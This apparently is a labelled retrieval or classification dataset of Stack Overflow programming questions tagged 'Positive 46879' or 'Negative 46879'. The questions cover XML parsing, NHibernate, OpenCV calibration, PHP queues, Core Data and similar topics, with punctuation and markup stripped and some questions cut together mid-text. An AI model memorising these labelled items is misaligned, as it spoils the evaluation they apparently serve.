Positive 46879 pDuring my app development Ive encountered a specific problem. Ive a database which contains following columns DossierTitle, DossierName, DossierCategory and DossierDescription. The Description is uniqe for every Dossier.p  ol liFirst of all Im calling my WebService which selects unique DossierTitle and forms an xml page. After that app parse this page and forms a number of unique cells in table View. Also it forms an array which consists of DossierTitle and Dossiercategory.li liNow I want to form a new tableView which would consist of DossierName and DossierDescription based on the DossierCategory Ive achieved on previous step. For this I want to call a new WebService and parse it using that Category as condition.li ol  pMy question is how can I pass Dossiercategory to my second parser so I can use it as condition Here is my

Positive 46879 pI hope that someone could help me out with my problem. Im kind of stuck and dont know where to go from here. p  pIm writing an app for parsing an xml file generated by krpano to allow certain actions be done without digging though the code. p  pThe way the xml file is structured is by having multiple  tags and they correspond to each panorama.p  pI have a simple TKinter app that loads an xml, displays thumbnails, allows to move them around, add hotspots, delete scenes and saves it at the end. The problem starts at the function that moves scenes. I have  a drag and drop functionality, but in the interest of space, Ill post a test function that was written first and that moves scenes just by one position. p  precodefrom bs4 import BeautifulSoup  def loadxmlself     f  tkFileDialog.askopenfile     self.xml  BeautifulSoupf,xml Tried lxml and html5lib already     self.filepath  os.path.dirnameos.path.abspathf.name     return self.xml  def movesceneself, scenename, direction      Direction should be 1 for forward, 1 for backward.     scenes  self.xml.findallscene     for i, scene in enumeratescenes         if scene[name]  scenename             if direction  1                 scenes[i1].insertafterscene             else                 scenes[i1].insertbeforescene     self.showthumbs codepre  pAnd here is showthumbs functionp  precodedef showthumbsself     if not getattrself, xml, None         self.loadxml     self.images  []     allscenes  self.xml.findallscene     ... codepre  pThe problems shows itself at codeself.xml.findallscenecode part of codeshowthumbscode function. When the image is moved forwardcodeinsertaftercode is used, it would always skip a scene ahead of which the current scene was moved and it wouldnt list it in codeallscenescode. It would show up if I printed codexml.prettifycode though... And if I save that output into xml file and reopen the app, the thumbnails would all be displayed properly according to how I moved them around before.p  pWhen codeinsertbeforecode is used, the findall would just hang and not do anything past itself. Once again, prettify shows correct output.p  pHere is a a hrefhttpkrpano.comtourscorfutour.xml relnofollowtest xml filea that Im using. I hope that someone can point me in the right direction.

Put more accurately, in the XML file p  pa hrefhttpi.stack.imgur.com9Mqfb.png relnofollowimg srchttpi.stack.imgur.com9Mqfb.png altenter image description hereap  pThe problem is that PugiXML parses these codenncode characters into codenncode.

Negative 46879 pIve been enamoured with component based programming be it with COM, another system, or just using the paradigm in plain C. It requires a bit of getting used to, if one is usually used to the traditional OOP model, but its definetely worth it. Its made my code more maintainable and easier to extend. p  pThe project Im currently working on is using the paradigm, but no set system. However, Id really like to find some sort of system I could use with the following requirements. Switching over from what I have now to a new system would take a bit of time, but Id save a multiple of that time later. p  pThe requirements p  ol liCrossplatform li liFast li liWorks well with C li liSupports crossprocess marshalling li ol  pLet me elaborate on those requirements p  pstrongCrossPlatformstrongp  pBasically, I need it to work on Windows and Mac. Linux would be nice, but is not in any way essential. Also, it really needs to fulfil the other requirements for all platforms. Theres a COM for Mac, which would be ideal but it doesnt support requirement 4. Additionally, it must support both GCC and MSVC. p  pstrongFaststrongp  pThis is where CORBA unfortunately loses, even though it fulfils the other three requirements. Inprocess method calls need to be as fast as possible ideally, like COM, since some of the routines might also be called from an audio interrupt.  p  pstrongWorks well with Cstrongp  p... I guess this one is mostly obvious. I dont mind not using C classes to implement components, though that would definetely be helpful, and the alternative must still be easy to use, especially since eventually I intend to release an API for 3rd party extensions. p  pstrongSupports crossprocess marshallingstrongp  pBy that I mean at least being able to serialize the calls. If this is done via code generated from an IDL, thats perfectly fine with me, and I also dont mind implementing the crossprocess communication itself. p  pCOM would be great, but it doesnt meet requirement 1 fully. CORBA would be great too, but it doesnt meet requirement 2 even with the fastest ORB out there. XPCOM might not meet requirement 2, and doesnt work with MSVC so doesnt meet requirement 1. p  pAny ideas what else is out there My next step would be to roll my own using protobufs or something similar, but of course Id like to avoid that. p  pstrongemUpdateemstrongp  pTo elaborate  an audio interrupt in this context can be as low as 23ms. That time isnt even available in full to me, as other components need to process in that time, and my software is itself wrapping another piece of software that needs to process in that time. This is why both inprocess and crossprocess marshalling needs to be extremely fast. p

Negative 46879 pIve been thinking about the a hrefhttpmikehillyer.comarticlesmanaginghierarchicaldatainmysqlmodified preorder tree traversala algorithm for storing trees within a flat table such as SQL.p  pOne property I dislike about the standard approach is that to insert a node you  have to touch on average N2 of the nodes everything with left or right higher than the insert point. p  pThe implementations Ive seen rely on sequentially numbered values. This leaves no room for updates.p  pThis seems bad for concurrency and scaling. Imagine you have a tree rooted at the world containing user groups for every account in a large system, its extremely large, to the point you must store subsets of the tree on different servers. Touching half of all the nodes to add a node to the bottom of the tree is bad.p  pHere is the idea I was considering. Basically leave room for inserts by partitioning the keyspace and dividing at each level. p  pHeres an example with Nsubmaxsub  64 this would normally be the MAXINT of your DBp  precode                     064                                                        131                   3263                                        214    1530         3347       4862 codepre  pHere, a node is added to the left half of the tree.p  precode                     064                                                          131                  3263                                    211  1120  2130     3347       4862 codepre  pThe alogorithm must be extended for the insert and removal process to recursively renumber to the leftright indexes for the subtree.

Negative 46879 pProblem I have a WinForms control MyControl with a dependency on myCli.dll, a dll written in C CLI.

Or at least what I should be looking to learn about to do it.p  pIm building a web app using JSP pages on the client with a JBoss server running J2EE, in the middle there is a tomcat web server.p  pBasically the app contains different sections that will be rolled out over time as theyre developed and also customers may be using different combinations of sections. The tidiest way of deploying this I can think of is to build each section into its own jar. Then depending on the combination of sections that are relevant for the customer, install only the required jars on the JBoss server for deployment.p  pTo support this Id like the client navigation menu to only show the available sections based on what is deployed on the JBoss server. Is it possible for my servlet to find out what is deployed on the server Id like the solution to be as dumb as possible, i.e. I dont want to tell it what to look for, other than a prefix to identify our jars, as I dont know yet everything we might build.p  pMy current solution is to have a table in the database to hold a list of the installed sections. But this is going to require update scripts etc during install and Im sure we should be able to do this by just deploying jars on the server.p  pThanks in advance.p

Negative 46879 pI am trying to do a very simple command line library for interactive Java programs. You start the Java program and it prompts you for commands. The syntax isp  precodegt action [object1, [object2, [... objectn] ... ]] codepre  pfor examplep  precodegt addUser name John Doe age 42 codepre  pHere codeaction  addUser, object1  name, object2  John Doe, object3  age, object4  42code. p  pEverything after strongactionstrong is an strongobjectstrong that is, an action uses objects. You can see that the action and the object are simple strings. Object strings can also be converted to numbers if necessary.p  pMy plan is that the user of this command line library would simply create methods belonging to any suitable Java object and assign each method to a specific action. The objects in the command line become parameters for the method the user assigns. A suitable class that implements a method for the example above would bep  precodeclass Foo      public void addUserHandler             String param1, String param2, String param3, Integer param4          do.someThing       codepre  pWhen a user types a command, the corresponding function assigned by the programmer gets called with the parameters specified in the command line.p  pI know that Java doesnt have function pointers like C or delegates like C and the way to implement callbacks is through an interface, however, I dont see how can I use interfaces in this scenario. The problem I see with interfaces is that they havep  ol liA fixed number of functions to be implementedli liThe functions to be implemented have a fixed declaration.li ol  pThe problem with 1 is that the user of my library may decide to implement any number of functions, for as many actions as he wants to support. The problem with 2 is that the user would want to assign functions with descriptive names, like addUserHandler for addUSer action.p  pIf Java had delegates or function pointers I would just create a Map between Strings representing actions and delegates for the actual implementation of the action in the program. I think I can emulate delegates with Reflection, but it is gory and I lose the type safety, as Id have to use String names for classes and methods. Is there any better wayp  pThanks,p

Negative 46879 pIm trying to prevent clicks on a list item while an animation is occurring. So at the top of my click handler, I want to do something like thisp  precodeifthis.isanimated       handle click code here  codepre  pNote the bang  in the if statement above. I havent tested, but I assume this will work. What Im not sure of is whether .isanimated will return true when run against an element that is being animated via fadeIn and fadeOut. I know that jQuery has a .animate function, and I assume animated certainly works against elements animated using that function, but will it work with those using fadeIn and fadeOut Thanks.p  pstrongUPDATEstrong After some dramatic misposts, all seems well, and thanks to the reponders for all the great followups and edits. In the end, I have found that, yes, animated matches those elements animated using fadeIn and fadeOut because the jQuery source uses .animate to achieve these effects. My final check was as originally postedp  precodeifthis.isanimated       handle click code here  codepre  p..rather than using .not as has been proposed in some instances though I believe these will work as currently posted. Thanks again.p

Negative 46879 pI have an old database that I am inheriting. The access rights are not clearly defined anywhere and Im looking for a quick way to get them for everyone. Lets say I have a user in my database that does not belong to any membership roles. However, they have been given access to do specific things to specific tables. For example, they can run select queries on table X and run update queries on table Y. I know I can find out what they have by going to the properties for each user. I would imagine, however, that there has to be a system table somewhere that has all of this defined in it and makes it easily queryable.

Negative 46879 pIm working on my first app now and its going quite well, but Im wondering if im using the correct app design.p  pIm building an app which makes use of a navigationController to display a couple viewcontrollers.p  pIn the first viewController a CustomObject is created and in the consecutive viewControllers properties for this customObject are chosen and set.p  pIve created a Singleton class which handles all coredata actions. creating a new object. saving the created object etc. The Singleton has a property currentObject. All ViewControllers have access to this singleton.p  pSo for example, in view 1 the user tabs a button new car. The CoreDataSingleton creates the new car object which is accessible using currentObject.p  pA new view is pushed and default values for the new car are shown.p  pThe user tabs select color, a new ViewController is shown where the color can be selected. Using the singleton.currentobject the color is set, the view is popped and other properties can be set and so on. Finally the user tabs Save and [Singleton saveCurrentObject] is called.p  pThis method works fine, but Ive been reading a lot of post on the web where people say that Singletons are bad, the worst you can do etc. etc..p  pWhat do you think about this application design If Singletons are bad, how would you implement this kind of functionalityp  pRegards, Michielp
Negative 46879 pI have two entities like so distilled to only whats relevantp  precodepublic class Person      public virtual Address Address   public class Address   codepre  pcodePersoncode has a manytoone relationship with codeAddresscode, or in object terms, a codePersoncode references an codeAddresscode, and this link is unidirectional codeAddresscode does not have a reference back to codePersoncode.p  pNow, if I use this codep  precode save a new person with a new address var person  new Person person.Address  new Address person.Save   change the persons address and save it again person.Address  new Address person.Save codepre  pThe first part does what its supposed to, it creates a new codePersoncode and a new codeAddresscode in the database.p  pHowever, the second part will update the existing codePersoncode and create a new codeAddresscode, but it doesnt delete the noworphaned first address. What do I have to do in order to get NHibernate to recognize that Im changing the reference to a new entity and automatically garbage collect the orphaned entity Or do I have to do this manuallyp  h2Possible Solutionh2  pAlthough I dont have conclusive evidence that this indeed whats going on, I think the reason for this problem is because of the objectrelational impedance mismatch. In programming, we know that objects hold references to other objects, and once those references are lost, garbage collection will come and delete those orphaned objects that no longer have any references pointing to them. In the example I provided, codePersoncode has a reference to codeAddresscode, and once the reference to codeAddresscode is lost, it will get garbage collected, assuming no other codePersonscode have a reference to it as well.p  pOn the database side, there is no concept of garbage collection. To the database, there is only onetomany or manytomany relationships, or in other words, a parent with a collection of children. Going back to codePersoncode and codeAddresscode, we see that this is a onetomany relationship from codeAddresscode to codePersoncode each person can only have one address, but an address can belong to many people, such as a household of people that share a common address. The database considers the codeAddresscode the parent and the codePersoncode as a collection of children. Thus, it makes sense that by deleting a codePersoncode, the codeAddresscode should not be deleted as well put another way, if you have a bookshelf with a collection of books, deleting a book should not delete the bookshelf.p  pSo how do we fix this Well have to delete any parents where their child collections are empty. In this case, an codeAddresscode with an empty collection of codePersonscode should be deleted. This is a business rule, as nothing states that an codeAddresscode cannot exist by itself, but in the application Im developing, an codeAddresscode by itself means nothing if its not attached to a person, and thus should be eliminated. However, its entirely possible for the address to remain in an orphaned state until some other codePersoncode comes along and references it.p

Negative 46879 pI hardly see any pointer on the following problem related to Hibernate. This pertains to implementing inheritance using a single database table with a parentchild relationship to itself. For examplep  precodeCREATE TABLE Employee    empId BIGINT NOT NULL AUTOINCREMENT,   empName VARCHAR100 NOT NULL,   managerId BIGINT,   CONSTRAINT pkemployee PRIMARY KEY empId  codepre  pHere, the emmanagerIdem column may be null, or may point to another row of the emEmployeeem table. Business rule requires the Employee to know about all his reportees and for him to know about hisher manager. The business rules also allow rows to have null emmanagerIdem the CEO of the organisation doesnt have a manager.p  pHow do we map this relationship in Hibernate, standard manytoone relationship doesnt work here Especially, if I want to implement my Entities not only as a corresponding Employee Entity class, but rather multiple classes, such as Manager, Assistant Manager, Engineer etc, each inheriting from Employee super entity class, some entity having attributes that dont actually apply to all, for example Manager gets Perks, others dont the corresponding table column would accept null of course.p  pExample code would be appreciated I intend to use Hibernate 3 annotations.p

Negative 46879 pWith MVVM, I think of a viewmodel as a class that provides all the data and commands that a view needs to bind to.p  pBut what happens when I have a database entity object, say a codeCustomercode, and I want to build a class that shapes or flattens the Customer class for use in a data grid. For example, maybe this special Customer object would have a property codeTotalOrderscode, which is actually calculated using a join with a collection of codeOrdercode entities.p  pMy question is, what do I call this special codeCustomercode class In other situations, Id be tempted to call it a codeCustomerViewModelcode, but I feel like overloading the notion of a viewmodel like this would be confusing in an MVVM project. What would you suggestp

Negative 46879 pFirst, it is long post so if you need clarification please let me know.p  pIm new to Java and having difficulty deciding whether I should use int[] or Integer[]. I wrote a function that find oddnumber from int[] array.p  precodepublic int[] findoddint[] arr          int[] result  new int[arr.length]         forint i0 iltarr.length i              ifarr[i]  2  0                  System.out.printlnarr[i]                 result[i]  arr[i]                               return result      codepre  pThen, when I pass the int[] array consisting of some integer like belowp  precodeint[] myArray  1, 0, 1, 2, 3 int[] result  findoddmyArray codepre  pThe array result containsp  p0, 1, 0, 1, 0, 3p  pBecause in Java you have to define the size of array first, and empty int[] array element is 0 not null. So when I want to test the findodd function and expect the array to have odd numbers which it does only, it throws the error because the array also includes 0s representing empty cell as shown above.p  pMy test codep  precodepublic void testFindOddPassValidIntArray          int[] arr  2, 1, 0, 1, 3         int[] result  findOddObj.findoddarr          check if return array only contain odd number         forint i0 iltresult.length i              ifresult[i]  null                  assert isoddresult[i]  result[i]                             codepre  pSo, my question is should I use int[] array and add check for 0 element in my test likep  precodeifresult[i]  0    assert isoddresult[i]  result[i]  codepre  pBut in this case, if findodd function is broken and returning 0 by miscalculation, I cant catch it because my test code would only assume that 0 is empty cell.p  pOR should I use Integer[] array whose default is null How do people deal with this kind of situationp

Negative 46879 pI have been Googling to try and find an equivalent in Python to some of Perls file test operators. p  pMost of the file test operators are just a direct Pythonification of the underlying os codestatcode call. For example, codeos.statfile.stctimecode just reads the inode change time as the nix codestatcode utility or codels lcode would do.p  pSome of the Perl file test operators I cannot find an equivalent in Python. For example, I have a data tree of 85,000 image files created by a variety of applications. Some of the files have the a hrefhttpunixpapa.comincnotesetuid.htmleffective UIDa set in a way that is nettlesome and a modification fails for a permission issue. So for those files I need to run something likep  precode find . type f print0  perl 0 lnE say unless w  change euid... codepre  pSince I have not found the equivalent in Python, I have to shell out to Perl to find these files. I found a hrefhttpblog.endpoint.com200908filetestcomparisontableforshell.htmlthis tablea which suggests there is no direct equivalent. Truep

Negative 46879 pMy scenario is an application working cyclically on real time data and with tigh deadlines. p  pI have a serie of actions to take on data at each cycle. Ive actions that take place at each cycle lets call them with capital letters like strongAstrong, strongBstrong, strongCstrong.. and other actions that take place only every x cycles lets call them with lowercase letters like strongdstrong, strongestrong, strongfstrong,.... A flow pattern example, having two persistent actions and one taking place with a period of 3 cycle could be end of cycle is marked by p  pstrongAstrong  strongBstrong  strongdstrong  strongAstrong  strongBstrong  strongAstrong  strongBstrong  strongAstrong  strongBstrong  strongdstrong ...p  pMoreover, the pattern could change at runtime accordingly to users input. So some actions could be added or removed from the list. For instance, the previous pattern by removing strongBstrong, adding strongCstrong after strongAstrong and strongestrong after strongCstrong with a period of 2 cycles would suddenly become change cycle marked by p  p... strongAstrong  strongBstrong  strongdstrong   strongAstrong  strongdstrong  strongCstrong  strongestrong  strongAstrong  strongCstrong  strongAstrong  strongCstrong  strongestrong  strongAstrong  strongdstrong  strongCstrong  strongAstrong  strongCstrong  strongestrong  strongAstrong  strongCstrong  strongAstrong  strongdstrong  strongCstrong  strongestrong ...p  pRight now I start manually threads that communicate each other through WaitHandles and that, in case the action is heavy, make use of Parallel.For. Then when the pattern changes I may have for instance to terminate a certain thread, launch another one, substitute the WaitHandle on which to wait on... I have deadlock problems that arise when the pattern changes. I could fix them, but I came to the idea that it would be much better to have a more flexible solution, so that if I need to change the pattern later on, Ive already all the tools to do it efficiently.p  pIm pretty new on this topic but I think following also what it has been suggested to me a hrefhttpstackoverflow.comquestions5039679howtosubstituteatruntimethewaithandlethatathreadshouldwaitonprevioulsya I need a sort of scheduler.p  pIve read something about Windows Workflow Foundation I do not know at the moment whether its suitable for my situation and other solutions but I would need to know the best direction to take before spending time on understanding it. For instance Tasks are more suitable for this Or should I stick on threads and create a Scheduler class for managing all possible situations In this case I see already different issues on the changing of patterns and I would be greatful if you could go deeper into the problem Or there are better alternativesp  p[EDIT]br Actions can be executed when the previous main action strongAstrong, strongBstrong,... in the cycle has terminated. Minor actions strongdstrong, strongestrong,... can be executed concurrently. For instance in a cylcle of type strongAstrong  strongBstrong  strongdstrong  strongestrong action strongBstrong can be executed only after strongAstrong, action strongdstrong only after strongBstrong and action strongestrong only after strongBstrong and also possibly concurrently with strongdstrong.  Moreover, if I do not group two successive main actions in the example one might think that strongAstrong and strongBstrong could be grouped into one single action because of their interdependency it means that are executed in two different threads. The reason for this is that I use circular buffers for storing intermediate results in the example the result coming from strongAstrong and that will be later used by strongBstrong. Buffers help me on not losing data during the real time process in case for some reason there is a delay in the process in fact the main leader action strongAstrong will always occur with a good timing accuracy regardless the last action in the cycle has finished or not.p

Negative 46879 pstrongBackgroundstrongp  pIm currently working on a stereo vision project using OpenCV. Im trying to create a disparity map from a set of two rectified images, but Im not getting the result I expect. When looking at the rectified images, there is a noticeable emvertical shiftem between the images, which should not be there after rectification. Im currently looking for what the error may be. My code is based on the stereo calibration and correspondence code from the OpenCV book, and a hrefhttpscode.ros.orgtracopencvbrowsertrunkopencvsamplescppstereomatch.cppthis examplea. I use the C interface of OpenCV. My OpenCV version is 2.1, from the Ubuntu 11.04 repository.p  pstrongShort version of questionstrongp  pWhat rms return value is acceptable for the functionp  precodedouble cvcalibrateCamera... codepre  pI currently calibrate each camera using a set of 20 chessboard image pairs. The cameras are two identical PS3 Eyes with a resolution of 640480 pixels mounted beside each other. cvcalibrateCamera returns an rms error of between strong160strong and strong300strong Ive had different result with different image sets. Is this an acceptable value for this image resolution or should I attempt to get better chessboard imagesp  pstrongLong version details, code samplesstrongp  pTo get working stereo vision first, I want to be sure the camera calibration routine works correctly. I use a series of chessboard images to calibrate my stereo setup, like sop  precode Find chessboard corners cvMat left  ... Load image vectorltcvPoint2fgt points  bool found  cvfindChessboardCornersleft, patternSize, points, CVCALIBCBADAPTIVETHRESH  CVCALIBCBNORMALIZEIMAGE iffound   cvcornerSubPixleft, points, cvSize11, 11, cvSize1, 1, cvTermCriteriaCVTERMCRITEPS  CVTERMCRITITER, 30, 0.1 imagePointsLeft.pushbackpoints codepre  pI do this for a number of image pairs and put the resulting points in imagePointsLeft and imagePointsRight. I have run a check in a separate program on the same images where I visually confirm that the left and right images correctly register all corners, in the same order, using cvdrawChessboardCorners. For each image pair I also fill a set of object coordinates like sop  precodevectorltcvPoint3fgt obj forint i  0 i lt ny i   forint j  0 j lt nx j     obj.pushbackcvPoint3fisquareSize,jsquareSize,0.0 objectPoints.pushbackobj codepre  pI then attempt to calibrate the cameras with these imagesp  precodedouble rms  cvcalibrateCameraobjectPoints, imagePointsLeft, mimageSize, mcameraMatrixLeft, mdistortionMatrixLeft, rvecsLeft, tvecsLeft codepre  pI use the camera intrinsics from this function when I call cvstereoCalibrate using the flag CVCALIBFIXINTRINSIC this way of stereo calibration is suggested in the documentation, a hrefhttpopencv.willowgarage.comdocumentationcppcalib3dcameracalibrationand3dreconstruction.htmlstereoCalibrateherea.p  pI proceed to call cvstereoRectify and cvinitUndistortRectifyMap, the latter for both cameras. The rectified images are produced with cvremap using the output of initUndistortRectifyMap and a camera livefeed. Both images contain only valid pixels no black areas. My problem is that the pixels of a given row does not match the same row in the other image there is a slight vertical offset.

Negative 46879 pI am currently trying to implement a job queue in php. The queue will then be processed as a batch job and should be able to process some jobs in parallel.   p  pI already did some research and found several ways to implement it, but I am not really aware of their advantages and disadvantages. p  pE.g. doing the parallel processing by calling a script several times through codefsockopencode like explained herebr a hrefhttpphplens.comphpeverywhereqnodeview254Easy parallel processing in PHPap  pAnother way I found was using the codecurlmulticode functions.br a hrefhttpwww.php.netmanualenfunction.curlmultiexec.phpcurlmultiexec PHP docsa  p  pBut I think those 2 ways will add pretty much overhead for creating batch processing on a queue taht should mainly run on the backgroundp  pI also read about codepcntlforkcode wich also seems to be a way to handle the problem. But that looks like it can get really messy if you dont really know what you are doing like me at the moment .p  pI also had a look at codeGearmancode, but there I would also need to spawn the worker threads dynamically as needed and not just run a few and let the gearman job server then sent it to the free workers. Especially because the threads should be exit cleanly after one job has been executed, to not run into eventual memory leaks code may not be perfect in that issue.br a hrefhttpgearman.orgindex.phpidgettingstartedGearman Getting Startedap  pSo my question is, how do you handle parallel processing in PHP And why do you choose your method, which advantagesdisadvantages may the different methods havep  pThanks for any input. p
Negative 46879 pBit of a weird one this Ive got a shared Office addin that currently targets Outlook 2007 on XP and Win7 ExcelWord and other versions later.  It adds a toolbar button, and this fires off my code.  My code just reads data from Outlook.  First time round, it works a treat.  Second time, the button click does nothing.  No errors, nothing.  The rest of Outlook responds as normal.p  pThe entire event code is in a trycatch that writes any exceptions out to a temporary file this mechanism works if a throw an exception in code, but nothing is picked up.p  pAccording to the Trust Center, my addin is active not inactive or disabled.  If I restart Outlook, or stop and start the addin via the Trust Center, it again works once and then stops.p  pIf I reduce the amount of work my code does, the button will sometimes respond for about ten clicks or so, then gives up.  Whichever version of my code I try, resources dont seem to change much memory moves up a mite, the thread count stays the same.p  pIve read of a similar thing with Word, but this was explained by Word recreating the toolbars or menus every time it loads a document not sure how correct this is.  For me, I select an email, click once, it works, click again no changing views in Outlook, selecting different emails, etc, and it doesnt.p  pHas anybody got any clues herep

Negative 46879 pI want my UserControls BackGround to look like its not there.

My UserControl could take Parents BackGroundImage and stretch it every time it needs to redraw, and then just take a piece of it and set it as its BackGroundImage, but Form draws its stretched background outside its visible rectangle. So I can see then the diffrence, it doesnt fit. p  pI made it working and it fits the Parents BackGroundImage, but its a lot of code and slowing down my program when resizing.p  pThere must be a simplest way to do that. I dont mean using ControlStyles.SupportsTransparentBackColor. I want it to look just like there were no UserControls background.p

Negative 46879 pI have 2 tables Wordpress Database, one which stores posts and the other post meta. For this example, the posts table is storing information about venues i.e. bars or clubs.

I have the following query.p  precodeSELECT posts., AVGmeta.metavalue as average  FROM wpposts as posts  LEFT JOIN wppostmeta as meta       ON posts.ID  meta.postID   WHERE meta.metakey  rating       AND posts.poststatus  publish       AND posts.posttype  npcvenue   GROUP BY meta.postid  ORDER BY posttitle asc codepre  pThis works great except for one issue. If a venue has not yet received a rating, then there is no rating entry in the wppostmeta table, and thus it is not pulled in the query.p  pQuestion is How can I pull all venues from the database, with their average rating, even when they have not yet received a rating. Thanks in advancep  pEDIT If a venue has not been rated yet, then there is no rating entry in the wppostmeta table, which brings up the question, what does NULL mean exactly NULL is typically used for an unknown value. However, when the entry is missing completely from the table, is it still considered NULL Or does it just become an empty rowsetp

Negative 46879 pIm working on a web application that requires me to use a modalpopup I recently made within a user control. Everything works as expected, but somehow after a PostBack, and not always, the panel used in the modal flickers blink on the screen very briefly. I have read on dozens of forums saying that I needed to add displaynone to the style tag of this panel. This usually helps, and most of the postbacks dont show the panel, but some do. Seems that the property is being ignored somehow, but I cant find where, how, when. p  pI have also tried debuging the javascript with firebug, tested all page events and even tried taking a look at the ajax modalpopupextender sourcecode, but couldnt fix this issue. The browser I strongHAVEstrong to make this web application work is Mozilla Firefox 3.5.10, that is the current version on the company I work for. This cant be changed due to corporate policies.p  pDue to quality and user experience issues that arise with this flickering, I leave it as is, so if anyone can help me out Id appreciate that. Im also on a rather tight schedule, so any quick help will be appreciated too, as Im ready to try and test changes on the go.p  pPlease let me know of any doubts or questions.p  pThanks in advance.p

Negative 46879 pI have a multitenant Rails app that creates support tickets. The tickets are supposed to have incremetal ticket numbers. I cant use the ID column, because since the app will be used by different accounts, they will find odd ticket numbers.p  pFor example, if Account 1 creates two tickets, they get Ticket 1 and Ticket 2. Account 2 creates one ticket, he gets Ticket 3. That would be odd because hes supposed to get Ticket 1, because its the first ticket he creates under his account.p  pSo, Im supposed to add a ticketnumber column to the tickets table. Now, how would you go about incrementing the numbers automatically and being separated from other accountsp

Negative 46879 pto accomodate testing in a large batch system I would like to have the possibility to export data from many tables that are all in a master  detail relationship, i.e. they are connected via foreign keys. I know I can do that programmatically via DBUnit for example.

Negative 46879 pIve been on this issue for probably a good two months now and really havent found a stable solution so I thought Id just try to ask. I have an existing site already at a hrefhttpkeyjaycompound.com relnofollowhttpkeyjaycompound.coma that runs off a CMS that I designed. While it was good at the time, Ive now outgrown it and looking at it now, looks sloppy XD. p  pSo at first I started redoing the CMS when I thought and read that there are so many CMS solutions available, why spin my wheels It seemed more logical to get a third party solution that does the mondain tasks like article CRUD and user management where Id primarily worry about the addons.p  pSo I searched and tried many solutions that I thought would suite my PHP development needs. As my testing base, I needed to see how well my current site would transfer over and how much hassle would ensue. While CMSs like Drupal, E107, and others were great....on paper, neither seem to suite my need. They were either too bloated, lacking in documentation or community support, seemly comprised of large hassle for simple tasks, or just downright confusing lt.p  pSo now the road has put me at Frameworks now in which Im currently trying to learn Code Igniter. Now my issue becomes security One of the advantages of CMS systems like Drupal or Joomla is that they have and constantly are field tested for security holes. Something a lone modest experienced developer like myself would probably never find. However what some have told me is that the fact that the CMS would be designed by me does create somewhat of a layer of security considering its not common to the public as much as Drupal or Wordpress.p  pSo with that here are my questions. In consideration of time and practicalityp  ol lihow do pros actually do something like this select a content management system for their projectli liDo they start with frameworks and build out, adjusting to security problems along the wayli liDo they use a particular CMS solution so they dont worry as much about common security holesli liMaybe I should start with a framework like Codeigniter and growing with it as my security and user management needs change li ol  pThanks guys. Id really like to finally stick with a solution to learn so I can finally get back to developing.p

Negative 46879 pI have been looking for some examples and solutions using the jquerydatatableseditable plugin and not had any luck. What I want to do is be able to set the editor for a column based on some identifier in that particular row.

Negative 46879 pIm working in OS X Lion on a Core Data based Cocoa application where I need to be able to save different parts, lets say partA and partB, of the data model into separate files.p  pI need to be able to save both files together as a project filepackage, but also need to be able to load and save partA independently from partB.p  pLoading a new partA file should replace all data currently associated with partA. Saving partA should not save data changed in partB.p  pEntities in partA do need to maintain relationships with entities in partB but these can and most likely have to be weak.p  pMy main question is What would be the best approach for implementing the desired featuresp  hr  pMy first approach has been one codeNSManagedObjectModelcode containing two configurations, one for each of the parts. I have two codeNSPersistentStorecode instances assigned to my codeNSPersistentStoreCoordinatorcode one for each of the configurations. And one codeNSManagedObjectContextcode instance with the codestoreCoordinatorcode assigned to it.p  pSaving and opening separate files are currently my main concerns in this appraoch. codeNSManagedObjectContextcode codesavecode message seems to save both configurations. Is it possible to only save changes made to objects that belong to a specific configuration of the codeNSManagedObjectModelcode Or would I need two codeNSManagedObjectContextcode instances, one for each of the configurationsp  pOpening a file by adding a store to the codepersistentStoreCoordinatorcode for partA adds data to the context and so far I have not been able to replace data. Is there a way to know which store is associated with a certain configuration, perhaps by sending a message to the codepersistentStoreCoordinatorcodep  pIm also thinking of a second approach Setting up two subclasses of codeNSPersistentDocumentcode one for each configuration in my data model to be able to save the data into separate files. But Im not sure if having two separate codeNSManagedObjectContextcode instances would allow setting up relationships between codeNSManagedObjectcode subclasses in the different configurationsp  pIf anyone has a good idea or can point me in the right direction or even has an example of how I could implement the above features, that would be highly appreciated.p

Negative 46879 pI am trying to use a jQuery listener to listen for a users clicks on the html body and perform a specific function if anywhere on the body has been clicked except for a specific div and the children within that div. p  pThe idea is that the div is a popup type element and instead of having to have a close button that the user can click, they should just be able to click anywhere on the page besides that div and it will automatically close.p  pI have been using this listenerp  precodevar initialClick  false body.onclick.addPhoneListeners, functionevent      var target  EventUtility.getTargetevent     ifinitialClick          iftarget.parentNode.id  clone.id ampamp target.id                finish                   initialClick  true  codepre  pWhich listens for all clicks on the body and unless the click comes from within the element I want the user to be able to interact with, it closes. Unfortunately this only works with a div that has only one level of children. As soon as I start getting multiple hierarchies such as thisp  precodeltdiv idaddressContainergt     ltdiv idaddress classhidden rowgt         ltdiv classrowgt             ltdiv idaddress.primary classhiddengtPltdivgt             ltdiv idaddress.typegtltdivgt             ltdiv idaddress.streetgtltdivgt             ltdiv idaddress.editButton classhiddengtlta idaddressEditButtongtEditltagtltdivgt             ltdiv idaddress.deleteButton classhiddengtlta idaddressDeleteButtongtDeleteltagtltdivgt         ltdivgt         ltdiv classrowgt             ltdiv idaddress.citygtltdivgt             ltdiv idaddress.stategtltdivgt             ltdiv idaddress.zipgtltdivgt         ltdivgt         ltinput typehidden idaddress.idgtltinputgt     ltdivgt ltdivgt codepre  pThe target.parentNode.id gives me the objects parent element as opposed to the addressContainer id and thus does not work. Is use the top level parent from within nested elements Other elements will be using this same code, so it has to work on both divs with just one level and divs with multiple.p  pUPDATE Found a few excellent solutions, thanks guys. I do however have one other question. Refer to my code above where I set an initialClick boolean to false, then set it to true. I am doing this because for some reason if I dont, when I go to add the popup div, the initial click from the button used to set that popup fires the listener and closes the popup before I have a chance to do anything. This has been my solution around the problem, but is that the only way Or am I just setting the listener slightly incorrectp

Id like my generator to have an attackrelease setting i.e., an amplitude envelope.p  pI understand how to create a vector full of sine values. What I dont know is how to apply an amplitude envelope to my vector data.p  pI know I could create a ramped vector using vDSPvgen to create a linear volume envelope vector and multiply my sine vector by my envelope vector. This seems wasteful, though, because Im dealing with many data points and creating an intermediate vector just to store the amplitude envelope is quite wasteful of memory in my environment.p  pWhats the best way to work with an amplitude envelope with the Accelerate frameworkp  pNote I am new to vector programming so please bare with me.p

